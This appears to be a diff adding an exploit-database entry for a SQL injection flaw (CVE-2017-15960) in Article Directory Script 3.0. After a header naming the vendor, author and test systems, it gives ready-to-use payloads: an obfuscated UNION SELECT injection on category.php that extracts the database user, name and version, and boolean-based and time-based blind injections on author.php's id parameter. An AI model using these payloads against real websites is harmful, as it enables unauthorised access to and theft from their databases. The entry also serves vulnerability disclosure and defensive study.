@@ -1,0 +1,43 @@
+# # # # # 
+# Exploit Title: Article Directory Script 3.0 - SQL Injection
+# Dork: N/A
+# Date: 30.10.2017
+# Vendor Homepage: http://www.yourarticlesdirectory.com/
+# Software Link: http://www.yourarticlesdirectory.com/
+# Demo: http://www.yourarticlesdirectory.com/livedemo.php
+# Version: 3.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2017-15960
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# http://localhost/[PATH]/category.php?id=[SQL]
+# 
+# 18++/*!02222UniOn*/+(/*!02222SeleCt*/+0x283129,/*!02222CONCAT_WS*/(0x203a20,USER(),DATABASE(),VERSION()),0x283329,0x283429,0x3078323833353239)--+-
+# 
+# http://localhost/[PATH]/author.php?id=[SQL]
+# 
+# Parameter: id (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: id=18 AND 8646=8646
+# 
+#     Type: AND/OR time-based blind
+#     Title: MySQL >= 5.0.12 AND time-based blind
+#     Payload: id=18 AND SLEEP(5)
+# 
+# Parameter: id (GET)
+#     Type: AND/OR time-based blind
+#     Title: MySQL >= 5.0.12 AND time-based blind
+#     Payload: id=27 AND SLEEP(5)
+# 	
+# Etc..
+# # # # #
